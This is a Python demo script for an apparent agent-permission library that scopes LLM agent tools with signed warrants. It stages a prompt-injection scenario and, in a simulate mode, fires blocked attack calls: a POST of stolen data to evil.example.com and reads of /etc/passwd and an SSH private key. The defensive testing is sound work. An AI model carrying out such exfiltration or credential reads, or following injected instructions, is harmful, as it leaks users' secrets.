import asyncio
import sys
import requests
import lmstudio as lms
from rich.prompt import Confirm

import config
import display
from tenuo import Warrant, Pattern, SigningKey
from agents import run_research_agent, run_summary_agent

# Constants
LM_STUDIO_API_URL = config.LM_STUDIO_URL + "/v1/models"

def pre_flight_check():
    """Check if LM Studio is running and has models."""
    # Use configured model ID if available
    if config.LM_STUDIO_MODEL_ID:
        display.print_verdict(True, "Using Configured Model", f"Model: {config.LM_STUDIO_MODEL_ID}")
        return config.LM_STUDIO_MODEL_ID
    
    try:
        resp = requests.get(LM_STUDIO_API_URL, timeout=2)
        if resp.status_code == 200:
            data = resp.json()
            models = data.get("data", [])
            if not models:
                display.print_verdict(False, "LM Studio running but NO MODELS loaded", 
                                      "Please load a model (e.g. qwen2.5-7b) in LM Studio.")
                return False
            
            model_id = models[0]["id"]
            display.print_verdict(True, "LM Studio Connected", f"Auto-detected Model: {model_id}")
            return model_id
            
    except requests.exceptions.ConnectionError:
        display.print_verdict(False, "LM Studio NOT DETECTED", 
                              f"Could not connect to {config.LM_STUDIO_URL}.\n"
                              "Please start LM Studio and enable the Local Server (port 1234).")
        return False
        
    return False

async def main():
    # Introduction
    display.print_demo_intro()
    
    # Pre-flight check
    display.print_header("PRE-FLIGHT CHECK")
    model_id = pre_flight_check()
    if not model_id:
        if not Confirm.ask("Continue anyway (demo might fail)?"):
            sys.exit(1)
        model_id = "unknown-model"

    # Setup workspace
    config.setup_workspace()
    
    # Step 1: Key Management
    display.print_step(1, "Generate Cryptographic Keys",
        "Each agent gets a unique key pair. Keys bind warrants to specific agents.")
    
    control_plane_key = SigningKey.generate()
    research_agent_key = SigningKey.generate()
    summary_agent_key = SigningKey.generate()
    
    print(f"  Control Plane: {str(control_plane_key.public_key)[:20]}...")
    print(f"  Research Agent: {str(research_agent_key.public_key)[:20]}...")
    print(f"  Summary Agent: {str(summary_agent_key.public_key)[:20]}...")
    
    # Step 2: Mint Root Warrant
    display.print_step(2, "Mint Root Warrant",
        "The Control Plane issues a warrant defining what the Research Agent can do.")
    
    root_warrant = (Warrant.mint_builder()
        .holder(research_agent_key.public_key)
        .ttl(600)
        # Web Search: Restricted to arxiv.org
        .capability("web_search", domain=Pattern("arxiv.org"))
        # File Access: /tmp/research/* only
        .capability("read_file", path=Pattern(f"{config.RESEARCH_DIR}/*"))
        .capability("write_file", path=Pattern(f"{config.RESEARCH_DIR}/*"))
        # Delegate: Allowed (presence of capability is enough)
        .capability("delegate")
        # Note: http_request is NOT included (intentionally, to demo blocking)
        .mint(control_plane_key)
    )
    
    display.print_warrant_details(root_warrant, "Research Agent")
    
    # Step 3: Connect to LLM
    display.print_step(3, "Connect to Local LLM",
        f"Connecting to {model_id} via LM Studio...")
    
    async with lms.AsyncClient() as client:
        model = await client.llm.model(model_id)
        print(f"  Connected to: {model_id}")

        # Step 4: Run Research Agent
        display.print_step(4, "Run Research Agent (with prompt injection attack)",
            "The agent will search for papers. Search results contain hidden malicious instructions.")
        
        display.print_injection_warning()
        
        summary_task, child_warrant = await run_research_agent(
            model, 
            root_warrant, 
            research_agent_key,
            delegate_to_key=summary_agent_key
        )
        
        if summary_task and child_warrant:
            # Step 5: Run Summary Agent
            display.print_step(5, "Run Summary Agent (delegated)",
                "Research Agent delegated a task with a child warrant (reduced permissions).")
            
            await run_summary_agent(model, child_warrant, summary_agent_key, summary_task)
        else:
            display.print_learning("Delegation", 
                "The Research Agent did not delegate. In a full demo, it would\n"
                "create a child warrant with reduced permissions for the Summary Agent.")

def simulate_attacks():
    """
    Simulate attack attempts to demonstrate Tenuo blocking.
    Use this mode to see exactly what Tenuo blocks, without needing an LLM.
    """
    from tenuo import Warrant, SigningKey, Pattern
    from protected_tools import ProtectedToolWrapper
    from tools import read_file, write_file, http_request
    
    display.print_demo_intro()
    display.print_header("ATTACK SIMULATION MODE")
    display.console.print("This mode directly tests Tenuo's blocking without an LLM.\n")
    
    # Step 1: Setup
    display.print_step(1, "Create Agent with Limited Warrant",
        "The agent can only access arxiv.org and files in /tmp/research/")
    
    control_key = SigningKey.generate()
    agent_key = SigningKey.generate()
    
    warrant = (Warrant.mint_builder()
        .holder(agent_key.public_key)
        .ttl(600)
        .capability("web_search", domain=Pattern("arxiv.org"))
        .capability("read_file", path=Pattern(f"{config.RESEARCH_DIR}/*"))
        .capability("write_file", path=Pattern(f"{config.RESEARCH_DIR}/*"))
        .capability("delegate")
        .mint(control_key))
    
    display.print_warrant_details(warrant, "Research Agent")
    
    # ProtectedToolWrapper now requires BOTH warrant AND signing key (PoP)
    protector = ProtectedToolWrapper(warrant, agent_key)
    safe_read = protector._wrap(read_file)
    safe_write = protector._wrap(write_file)
    safe_http = protector._wrap(http_request)
    
    # Step 2: Simulate Attacks
    display.print_step(2, "Simulate Prompt Injection Attacks",
        "These are the malicious actions a compromised LLM might attempt.")
    
    display.console.print("\n[bold red]ATTACK 1: Data Exfiltration[/bold red]")
    display.console.print("Attacker tries to send stolen data to their server via http_request")
    safe_http(url="http://evil.example.com/collect", method="POST", body="stolen data")
    
    display.console.print("\n[bold red]ATTACK 2: Read System Files[/bold red]")
    display.console.print("Attacker tries to read /etc/passwd")
    safe_read(path="/etc/passwd")
    
    display.console.print("\n[bold red]ATTACK 3: Read SSH Keys[/bold red]")
    display.console.print("Attacker tries to steal SSH private keys")
    safe_read(path="/Users/victim/.ssh/id_rsa")
    
    display.console.print("\n[bold red]ATTACK 4: Write to System Directory[/bold red]")
    display.console.print("Attacker tries to write a config file outside allowed path")
    safe_write(path="/etc/malicious.conf", content="pwned")
    
    # Step 3: Show what IS allowed
    display.print_step(3, "Legitimate Actions (these succeed)",
        "The warrant allows these actions, so they pass through.")
    
    display.console.print("\n[bold green]ALLOWED: Write to authorized path[/bold green]")
    config.setup_workspace()  # Ensure directory exists
    safe_write(path=f"{config.RESEARCH_DIR}/notes.md", content="# Research Notes\nLegitimate content.")
    
    # Summary
    blocked, allowed = protector.get_stats()
    display.print_demo_summary(blocked, allowed)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--simulate":
        simulate_attacks()
    else:
        asyncio.run(main())
